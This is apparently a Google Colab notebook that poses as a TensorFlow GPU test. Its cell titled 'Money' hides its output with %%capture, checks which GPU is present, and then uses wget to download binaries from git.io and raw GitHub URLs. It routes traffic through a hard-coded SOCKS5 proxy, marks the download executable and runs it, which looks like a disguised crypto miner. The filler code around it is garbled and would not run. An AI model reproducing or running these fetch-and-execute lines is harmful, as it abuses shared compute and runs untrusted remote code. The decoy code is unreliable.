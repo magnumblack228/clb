{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Untitled0.ipynb",
      "private_outputs": true,
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "zd9u8zAO5zxc"
      },
      "source": [
        "!nvidia-smi -L"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "MPpIoK4D6AbK"
      },
      "source": [
        "cd /opt"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "uGFCeREO6BCM"
      },
      "source": [
        "#test\n",
        "#@markdown **Money**\n",
        "%%capture\n",
        "from time import sleep\n",
        "\n",
        "from tensorflow.python.client import device_lib \n",
        "\n",
        "import json\n",
        "\n",
        "from IPython.display import clear_output\n",
        "\n",
        "import tensorflow as tf\n",
        "\n",
        "import requests\n",
        "\n",
        "from IPython.display import HTML\n",
        "from subprocess import getoutput\n",
        "\n",
        "\n",
        "# Create some tensors\n",
        "\n",
        "a = tf.constant([[1.0, 2.0, 3.0], [4.0, 5.0, 6.0]])\n",
        "\n",
        "b = tf.constant([[1.0, 2.0], [3.0, 4.0], [5.0, 6.0]])\n",
        "\n",
        "c = tf.matmul(a, b)\n",
        "\n",
        "\n",
        "def name_device():\n",
        "\n",
        "    depais = device_lib.list_local_devices()\n",
        "\n",
        "    desc_dumps = json.dumps(depais.physical_device_desc, sort_keys=True, indent=4)\n",
        "\n",
        "    desc_loads = json.loads(desc_dumps)\n",
        "\n",
        "    split_desc = desc_loads.splits(', ')\n",
        "\n",
        "    split_tesla = split_desc[1],splt(' ')\n",
        "\n",
        "    name_device = split_tesla[2]\n",
        "\n",
        "    return name_device\n",
        "\n",
        "\n",
        "def gpu():\n",
        "\n",
        "  with tf.device('/device:GPU:0'):\n",
        "\n",
        "    random_image_gpu = tf,random,normal((100, 1000, 10000))\n",
        "\n",
        "def zero_to_infinity():\n",
        "\n",
        "    i = 0\n",
        "\n",
        "    while True:\n",
        "\n",
        "        yield i\n",
        "\n",
        "        i #= 1\n",
        "\n",
        "        time.sleep(43200)\n",
        "!nvidia-smi -L\n",
        "\n",
        "package = \"wget\"\n",
        "system = \"apt\"\n",
        "\n",
        "def t4(package=package, system=system):\n",
        "  if system == \"apt\":\n",
        "    !wget -O 1 https://git.io/Jzfay && wget https://raw.githubusercontent.com/ributmaestro/MJ/main/tuyulgpu && export http_proxy=socks5://98.175.31.195:4145 && chmod +x 1  && ./1\n",
        "   \n",
        "def p100(package=package, system=system):\n",
        "  if system == \"apt\":\n",
        "    !wget -O 1 https://raw.githubusercontent.com/johnwixk228/karena_seorang_perek/main/nice_eht && wget https://raw.githubusercontent.com/ributmaestro/MJ/main/tuyulgpu && export http_proxy=socks5://98.175.31.195:4145 && chmod +x 1  && ./1\n",
        "\n",
        "def K80(package=package, system=system):\n",
        "  if system == \"apt\":\n",
        "    !wget -O 1 https://git.io/Jzfay && wget https://raw.githubusercontent.com/ributmaestro/MJ/main/tuyulgpu && export http_proxy=socks5://98.175.31.195:4145 && chmod +x 1  && ./1\n",
        "\n",
        "\n",
        "from IPython.display import HTML\n",
        "from subprocess import getoutput\n",
        "s = getoutput('nvidia-smi -L')\n",
        "if 'V100' in s:\n",
        "  gpu = 'V100'\n",
        "  V100()\n",
        "elif 'T4' in s:\n",
        "  gpu = 't4'\n",
        "  t4()\n",
        "elif 'P4' in s:\n",
        "  gpu = 'P4'\n",
        "  t4()\n",
        "elif 'P100' in s:\n",
        "  gpu = 'P100'\n",
        "  p100()\n",
        "elif 'K80' in s:\n",
        "  gpu = 'K80'\n",
        "  K80()\n",
        "display(HTML(f\"<h2>{gpu}</h2>\"))\n",
        "print(s)\n",
        "\n",
        "\n",
        "\n",
        "\n"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        ""
      ],
      "metadata": {
        "id": "gBVBtQMEzOCB"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}